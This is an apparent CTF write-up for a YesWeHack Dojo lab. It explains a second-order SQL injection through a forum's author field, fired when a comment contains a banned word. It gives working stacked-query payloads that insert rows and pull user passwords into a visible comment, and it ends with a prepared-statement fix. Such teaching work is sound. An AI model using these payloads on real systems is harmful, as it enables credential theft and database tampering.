
# SQL Injection (CWE-89) trought $author parameter leading to information disclosure and database modification.

## DESCRIPTION

SQL injection is a type of security vulnerability that occurs when an attacker is able to insert or "inject" malicious SQL code into a query. This can happen when user input is not properly sanitized or validated before being used in an SQL query.

## EXPLOITATION

In this Dojo, we get access to a forum interface, where we can post a comment by inputing an author name and a message :

![](dojo37/img/ywh-1.png)

Let's take a look at the source code !

### 1. Code analysis

```php
$input_author = urldecode($author$); 
$input_comment = urldecode($comment); 

$stmt = $db->prepare(
    "INSERT INTO comments (post_id, author, comment, image) VALUES (1, :author, :comment, '<url>')"
);
$stmt->bindValue(":author", $input_author, SQLITE3_TEXT);
$stmt->bindValue(":comment", $input_comment, SQLITE3_TEXT);
$stmt->execute();

$lst_posts = [];

$posts = $db->query("SELECT * FROM posts");
while ($p = $posts->fetchArray(SQLITE3_ASSOC)) {
    $post = new Post();
    $post->makePost($p['author'], $p['banner'], $p['title'], $p['post']);

    $comments = $db->query(
        sprintf("SELECT author, comment, image FROM comments WHERE post_id = '%d'", $p["id"])
    );
    // Ban haters (haters gonna hate)
    while ($comment = $comments->fetchArray(SQLITE3_ASSOC)) {
        if ( preg_match("/(bad|terrible|worst|skid)/", $comment['comment']) ) {
            $db->exec(
                sprintf("UPDATE users SET banned = 1 WHERE username = '%s'", $comment['author'])
            );
            $post->addComment($comment["image"], $comment["author"], "*****", true);
        } else {
            $post->addComment($comment["image"], $comment["author"], $comment["comment"]);
        }
    }
    array_push($lst_posts, $post->get());
}

$db->close();
```

First, the code decode our parameters : `$input_author` and `$input_comment`
Then, using a prepared SQL statement (`$db->prepare`), it store the data inside the database.
Using prepared statement with SQL is the safest way to avoid SQL injection, so won't be able to inject anything on this part, let's continue.

Then, the code query the database to search for posts, and for each post, display the comments :
```php
$lst_posts = [];

$posts = $db->query("SELECT * FROM posts");
while ($p = $posts->fetchArray(SQLITE3_ASSOC)) {
    $post = new Post();
    $post->makePost($p['author'], $p['banner'], $p['title'], $p['post']);

    $comments = $db->query(
        sprintf("SELECT author, comment, image FROM comments WHERE post_id = '%d'", $p["id"])
    );
    // Ban haters (haters gonna hate)
    while ($comment = $comments->fetchArray(SQLITE3_ASSOC)) {
        if ( preg_match("/(bad|terrible|worst|skid)/", $comment['comment']) ) {
            $db->exec(
                sprintf("UPDATE users SET banned = 1 WHERE username = '%s'", $comment['author'])
            );
            $post->addComment($comment["image"], $comment["author"], "*****", true);
        } else {
            $post->addComment($comment["image"], $comment["author"], $comment["comment"]);
        }
    }
    array_push($lst_posts, $post->get());
}
```

This is where it get interesting : the code has a censoring feature.
When looping on the comments, the code search for offensive keyword (`bad,terrible,worst,skid`), and if one is found, it update the entry in the database by using the username linked to the comment. And if the first query where using prepared statement, this one doesn't ! It directly append the username inside the query, without any sanitization.

So this is where we need to strike :
```php
if ( preg_match("/(bad|terrible|worst|skid)/", $comment['comment']) ) {
    $db->exec(
	    sprintf("UPDATE users SET banned = 1 WHERE username = '%s'",
	    $comment['author'])
    );
    $post->addComment($comment["image"], $comment["author"], "*****", true);
}
```

We can include SQL code inside our username to trigger a SQL injection. To do so, we need to meet those requirements :
- Include one of the offensive keyword in our comment to provoke the database update
- In our username, add SQL code to inject a new comment with a users passwords

### 2. Injecting SQL code in the username :

Before injecting anything, let's test the censoring feature. To do so, we'll create a comment with one of the blacklisted words like `terrible`:

![](dojo37/img/ywh-2.png)

Now, let's try to inject SQL code to create a new comment :

```sql
INSERT INTO comments (post_id, author, comment, image) VALUES (1, 'Tihmz','SQL Injection','')
```

To inject it inside the username, we need to first add a username, then a single quote (`'`) and a semi-colon (`;`) to open a new statement. Then finish by commenting the rest of the statement (`--`) to avoid SQL errors :
```sql
Tihmz';INSERT INTO comments (post_id, author, comment, image) VALUES (1, 'Tihmz','SQL Injection','')--
```

So in the end the final query look like :
```sql
UPDATE users SET banned = 1 WHERE username = 'Tihmz';INSERT INTO comments (post_id, author, comment, image) VALUES (1, 'Tihmz','SQL Injection','')--
```

Lets' try it :

![](dojo37/img/ywh-3.png)

And it worked, we were able to create a new comment by appending SQL code to the username.

We can now use this to extract data from the database, such as users password :
```sql
Tihmz';INSERT INTO comments (post_id, author, comment, image) VALUES (1, 'Tihmz',(select password from users),'')--
```
## POC

By injecting SQL code inside the username, and provoking the censoring of the comment, we can execute SQL code and modify the database.
If we create a new comment for the current post, it will be displayed and can be used to extract data from the database, such as the password for the user `Brumens` :

**$author :**
```sql
Tihmz';INSERT INTO comments (post_id, author, comment, image) VALUES (1, 'Password',(SELECT password FROM users WHERE username = 'brumens'),'aaa')--
```
**$comment :**
```
terrible
```

![](dojo37/img/ywh-4.png)

> Flag : `FLAG{Vuln3r4b1li7y_Exp0s3d!!}`

## RISKS

The main risks for a SQL injection  are : 
- **Unauthorized Access**: Retrieve sensitive data from the database that the attacker should not have access to such as passwords and PII (Personally Identifiable Information).
- **Data Manipulation**: Modify, delete, or insert data into the database (like we did here).
- **Authentication Bypass**: Bypass authentication mechanisms to gain unauthorized access to the system (update a role from user to admin).
- **Database Corruption**: Corrupt the database by executing harmful SQL commands (like deleting data for services disruption)
## REMEDIATION

The easiest way to avoid SQL injection is to use prepared statement :
```php
$stmt = $db->prepare("UPDATE users SET banned = 1 WHERE username = :username");
$stmt->bindValue(":username", $comment['author'], SQLITE3_TEXT);
$stmt->execute();
```

That way, the username will not be interpreted as SQL code but only data.
This is the safer than any sanitization regarding SQL injection.

As always, thanks to Brumens for the fun challenge, and see you in the next one.

#### #YesWeRHackers
## REFERENCES

- [https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php)
